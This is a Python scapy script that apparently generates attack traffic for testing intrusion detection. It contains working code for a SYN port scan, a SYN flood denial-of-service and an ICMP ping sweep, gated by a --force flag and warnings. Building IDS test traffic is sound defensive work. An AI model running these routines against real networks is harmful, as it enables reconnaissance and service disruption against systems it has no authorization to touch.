#!/usr/bin/env python3
"""Attack simulation tools for testing IDS."""

import argparse
import time
import sys
from scapy.all import IP, TCP, ICMP, send, sr1
from scapy.layers.inet import RandShort


def simulate_port_scan(target_ip: str, ports_range: tuple, rate: float = 1.0) -> None:
    """
    Simulate a port scan attack.

    Args:
        target_ip: Target IP address
        ports_range: Tuple of (start_port, end_port)
        rate: Packets per second
    """
    print(f"Simulating port scan on {target_ip} ports {ports_range[0]}-{ports_range[1]}")
    print("WARNING: This will send network packets. Use only on authorized networks!")

    start_port, end_port = ports_range
    delay = 1.0 / rate if rate > 0 else 0

    for port in range(start_port, end_port + 1):
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
        send(packet, verbose=False)
        if delay > 0:
            time.sleep(delay)

    print(f"Port scan completed: {end_port - start_port + 1} ports scanned")


def simulate_syn_flood(target_ip: str, dport: int, packets_per_sec: int, duration: int) -> None:
    """
    Simulate a SYN flood attack.

    Args:
        target_ip: Target IP address
        dport: Destination port
        packets_per_sec: Packets per second
        duration: Duration in seconds
    """
    print(f"Simulating SYN flood on {target_ip}:{dport}")
    print(f"Rate: {packets_per_sec} pps, Duration: {duration}s")
    print("WARNING: This is a denial-of-service attack simulation!")
    print("Use only on authorized networks and test environments!")

    delay = 1.0 / packets_per_sec if packets_per_sec > 0 else 0
    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        packet = IP(dst=target_ip) / TCP(dport=dport, sport=RandShort(), flags="S")
        send(packet, verbose=False)
        count += 1
        if delay > 0:
            time.sleep(delay)

    print(f"SYN flood completed: {count} packets sent")


def simulate_ping_sweep(network_cidr: str, rate: float = 1.0) -> None:
    """
    Simulate a ping sweep attack.

    Args:
        network_cidr: Network CIDR (e.g., "192.168.1.0/24")
        rate: Packets per second
    """
    print(f"Simulating ping sweep on {network_cidr}")
    print("WARNING: This will send ICMP packets to multiple hosts!")

    from ipaddress import ip_network

    delay = 1.0 / rate if rate > 0 else 0
    network = ip_network(network_cidr)
    count = 0

    for host in network.hosts():
        packet = IP(dst=str(host)) / ICMP()
        send(packet, verbose=False)
        count += 1
        if delay > 0:
            time.sleep(delay)

    print(f"Ping sweep completed: {count} hosts probed")


def main():
    """Main entry point for attack simulator."""
    parser = argparse.ArgumentParser(description="Attack simulation tools for IDS testing")
    parser.add_argument("--force", action="store_true", help="Required flag to run attacks")
    subparsers = parser.add_subparsers(dest="attack", help="Attack type")

    # Port scan
    portscan_parser = subparsers.add_parser("portscan", help="Simulate port scan")
    portscan_parser.add_argument("target", help="Target IP address")
    portscan_parser.add_argument("--start-port", type=int, default=1, help="Start port")
    portscan_parser.add_argument("--end-port", type=int, default=100, help="End port")
    portscan_parser.add_argument("--rate", type=float, default=1.0, help="Packets per second")

    # SYN flood
    synflood_parser = subparsers.add_parser("synflood", help="Simulate SYN flood")
    synflood_parser.add_argument("target", help="Target IP address")
    synflood_parser.add_argument("--port", type=int, default=80, help="Target port")
    synflood_parser.add_argument("--pps", type=int, default=100, help="Packets per second")
    synflood_parser.add_argument("--duration", type=int, default=10, help="Duration in seconds")

    # Ping sweep
    pingsweep_parser = subparsers.add_parser("pingsweep", help="Simulate ping sweep")
    pingsweep_parser.add_argument("network", help="Network CIDR (e.g., 192.168.1.0/24)")
    pingsweep_parser.add_argument("--rate", type=float, default=1.0, help="Packets per second")

    args = parser.parse_args()

    if not args.force:
        print("ERROR: --force flag required to run attack simulations")
        print("This is a safety measure to prevent accidental execution.")
        sys.exit(1)

    if args.attack == "portscan":
        simulate_port_scan(args.target, (args.start_port, args.end_port), args.rate)
    elif args.attack == "synflood":
        simulate_syn_flood(args.target, args.port, args.pps, args.duration)
    elif args.attack == "pingsweep":
        simulate_ping_sweep(args.network, args.rate)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()


